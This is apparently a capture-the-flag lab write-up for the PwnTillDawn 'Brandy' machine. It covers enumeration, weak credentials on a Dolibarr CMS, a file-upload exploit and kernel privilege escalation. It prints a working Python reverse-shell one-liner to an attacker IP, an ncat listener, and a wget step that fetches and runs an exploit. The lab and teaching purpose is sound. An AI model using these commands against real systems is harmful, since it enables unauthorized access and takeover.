![image](https://user-images.githubusercontent.com/87468669/220059104-e8f1bbed-988f-4e20-a2c7-2a70c51af391.png)

first start enumeration with nmap

`nmap -sC -sV -T4 -oN quicknmap.txt -Pn <IP>`

```
# Nmap 7.93 scan initiated Sat Nov 19 08:11:51 2022 as: nmap -sC -sV -T4 -oN quicknmap.txt -Pn 10.150.150.27
Nmap scan report for 10.150.150.27
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 45666234f121bf8b4318fb24a7f32976 (RSA)
|   256 1c2a2ee4e8eacceca5c444d018752434 (ECDSA)
|_  256 241a99372753a4ce0e30d414d068df2b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 19 08:12:53 2022 -- 1 IP address (1 host up) scanned in 62.68 seconds
```

![image](https://user-images.githubusercontent.com/87468669/220060232-8696498c-7058-4123-9f97-a4afcd62b2cf.png)

Noticed a web server running on port 80, opening it on a browser we got directed to a default `apache` webpage. checking the page source, there was nothing sus there. let's burst hidden dirs using ffuf.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/brandy]
└─$ ffuf -u "http://10.150.150.27/FUZZ" -w /usr/share/wordlists/dirb/common.txt -fc 403 -fs 0 -ic  -e .txt,.php,.bak,.sql,.zip

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.150.150.27/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .txt .php .bak .sql .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
 :: Filter           : Response size: 0
________________________________________________

                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 6113ms]
cart                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 194ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 167ms]
master                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 157ms]
:: Progress: [27684/27684] :: Job [1/1] :: 249 req/sec :: Duration: [0:02:02] :: Errors: 0 ::
```

let's check out the `cart` dir first.

![image](https://user-images.githubusercontent.com/87468669/220062081-a2b7b6a9-5713-46eb-a803-a930529f2fc1.png)

cool we got a vhost `crm.pwntilldawn.com`. let's add it to our hosts file. let's check the second dir `master`

![image](https://user-images.githubusercontent.com/87468669/220063054-295063a5-00df-4e7f-bfe3-5fdc3147b1f4.png)

we got a pic talking about `rick`, let's keep that name in our note. let's check the vhost.

![image](https://user-images.githubusercontent.com/87468669/220063389-5cbec98a-926e-4d74-a4f2-1cc016ad1751.png)

opening the vhost on a browser we got redirected to a login page and it is running a `Dolibarr 5.0.3` cms. 

![image](https://user-images.githubusercontent.com/87468669/220063858-43b4bc0b-dffc-4f56-bed9-a76d01c1edb1.png)

tried to login with creds `rick:rick` and bull's eye it worked. now let's look for an exploit for this cms.

![image](https://user-images.githubusercontent.com/87468669/220066911-7b1e363a-15a6-481d-ac48-ab2e49138075.png)

found an exploit on searchsploit. `php/webapps/49711.py` a file upload restriction bypass exploit.

![image](https://user-images.githubusercontent.com/87468669/220067390-2f5bf2cf-7d62-48cf-9154-3e1eb74738bf.png)

cool we got an rce, let's get a reverse shell.

![image](https://user-images.githubusercontent.com/87468669/220074968-93b7589b-16f1-4613-8eeb-a596065896bb.png)

fireup ncat listener.

reverse shell payload ready:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.66.67.146",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/brandy]
└─$ nc -lnvp 1337 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.150.150.27.
Ncat: Connection from 10.150.150.27:46238.
www-data@Brandy:/var/www/html/dolibarr/documents/users/2$ 
```
check back ncat listener and boom we got a reverse shell.

## Privilege Escalation

```
www-data@Brandy:/tmp$ uname -a
Linux Brandy 4.15.0-91-generic #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
![image](https://user-images.githubusercontent.com/87468669/220092233-2428a972-a9c3-4a82-af75-bcc410e7b7ac.png)

noticed it is running an old version of ubuntu, let's download the exploit into the target.

```
www-data@Brandy:/tmp$ wget 10.66.67.146/exploit.c
--2023-02-20 11:58:36--  http://10.66.67.146/exploit.c
Connecting to 10.66.67.146:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3560 (3.5K) [text/x-csrc]
Saving to: 'exploit.c'

exploit.c                               100%[===============================================================================>]   3.48K  --.-KB/s    in 0.001s  

2023-02-20 11:58:37 (4.83 MB/s) - 'exploit.c' saved [3560/3560]

www-data@Brandy:/tmp$ gcc exploit.c -o exploit
www-data@Brandy:/tmp$ chmod +x exploit
www-data@Brandy:/tmp$ ./ext
bash: ./ext: No such file or directory
www-data@Brandy:/tmp$ ./exploit 
bash-4.4# 
```
downloaded and run the exploit and bull's eye we got root.

![image](https://user-images.githubusercontent.com/87468669/220092844-6f4d1cb1-f897-415c-bb25-15a89321b15c.png)

and we are through.


